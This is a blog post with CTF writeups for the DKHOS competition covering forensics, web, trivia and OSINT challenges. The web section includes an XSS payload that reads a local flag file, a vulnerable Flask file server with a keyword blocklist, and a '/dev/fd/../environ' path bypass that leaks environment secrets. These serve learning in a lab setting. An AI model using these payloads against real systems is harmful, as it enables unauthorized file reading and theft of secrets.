---
layout: post
comments: true
title:  "DKHOS CTF - Writeups"
date:   2018-02-19 15:04:23
categories: [CTF]
tags: [CTF, DKHOS]
---

---

### Forensic 300 - Hadi Hoppala vede Cuppala 
---

The link provided in the task was a corrupted file with no clue.

![image]({{ site.baseurl }}/assets/images/post4/post4-9.jpg)

After a brief inspection on header, I understood that this was a [7z] file but got corrupted.

Found the instructions for proper header and footer values on http://www.7-zip.org/recover.html and started to work on this on the last 20 minutes but couldn't make it in time as I was having problem with CRC checksum.

![image]({{ site.baseurl }}/assets/images/post4/post4-10.jpg)

Just FYI, I also spend some time after CTF officially ended. This 7z file was also password protected. To crack it I used brute-forcing with rockyou and found 'piggies' was the password.

Flag:
```
DKHOS_{4l_G1rd1n_g1rd1n}
```
---

### Web 200 – Kımızım Kandan Bahtım Karadan

---

When we access to the ip provided, a web page with 'Not Found' text was welcoming us. After inspecting the website code we found the github repo of the [blog theme].

From here, first thing to do was actually Diff'ing the repo with the code in the site. And we've found a file upload section.
In here we also found an XSS vulnerability on Filename attribute and things were going really smooth!

With the code

```javascript
<script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///flag.txt");
x.send();
</script>
```

We were able to get the fl.. Unfortunately, it wasn't that easy:).

Just under the page, we have seen the 'DEV' environment and thought this could be a virtual host. We prepared the query and get the response:

```python
import os
from flask import Flask, request
app = Flask(__name__)
blist = (
'proc',
'www',
'var',
'etc',
'root',
'home',
'self',
'flag'
)
def get_flag():
    return os.environ.get('FLAG', '')
def super_firewall(path):
    for b in blist:
        if b in path:
            return False
    return True 
@app.route("/")
def hello():
    return "internal file storage, /file?name="
@app.route("/file")
def get_file():
    name = request.args.get('name', 'server.py')
    if not name:
        name = 'server.py'
    status = super_firewall(name)
    if not status:
        return "access denied"
    with open(name, 'r') as fp:
        content = fp.read()
        return content
if __name__ == '__main__':
    app.run(debug=False)
```

From here, it can be seen as FLAG was stored as an environment variable and we have to echo it somehow. In order to do it, we also need to bypass this mini filter blist.

After couple of trial and errors we prepared the query as:
```
/file?name=/dev/fd/../environ
```

and we got the flag:
```
LANG=en_US.UTF-8SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_ENABLED=1SUPERVISOR_PROCESS_NAME=internal
FLAG=DKHOS_{y0u_g0t_m3_pyth0n1st4}SUPERVISOR_GROUP_NAME=internalPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

---

### Trivia 400 – Kişi Faizi
---
Right after seeing this 'intentional English translation fails', I directly understood this was about TV Series 'Person of Interest' from the title.

![image]({{ site.baseurl }}/assets/images/post4/post4-1.jpg)

In the description, a document about Frank Stephens's death was mentioned and the flag was the date on it.  After a brief search on the net, I found the Season 1 Episode 3 could be helpful but watching the whole episode didnt make any sense. Thus I found the episode conversation script and searched for the name.

![image]({{ site.baseurl }}/assets/images/post4/post4-2.jpg)

After guessing the time according to these, the document with the flag was on that exact frame.

![image]({{ site.baseurl }}/assets/images/post4/post4-3.jpg)

---
### Cyber Intelligence 300 – Naber?
---

From the task description, it was clear that this was a social platform lookup.

![image]({{ site.baseurl }}/assets/images/post4/post4-4.jpg)

On the instagram, I've found the user with an interesting share. If looked closer, it can be understood that it was a github account!

![image]({{ site.baseurl }}/assets/images/post4/post4-5.jpg)

There was nothing suspicious on this repo as it was just a fork of another repo. Then in the commits I've found some nasty stuff.

![image]({{ site.baseurl }}/assets/images/post4/post4-6.jpg)

From here, I found the pastebin account:

![image]({{ site.baseurl }}/assets/images/post4/post4-7.jpg)

There was a strange text with a code in this pastebin. After trying telegram groups, we wanted to try whatsapp and found the flag as the name of the group!.



[blog theme]: https://github.com/BlackrockDigital/startbootstrap-clean-blog/tree/gh-pages
[7z]: http://www.7-zip.org
[The Foundation for Children with Leukemia]: http://www.losev.org.tr
[Invictus/Prodaft]: https://www.invictuseurope.com/
[Siberyildiz]: https://www.siberyildiz.com/
[Twitch]: https://www.twitch.tv/hackingwars

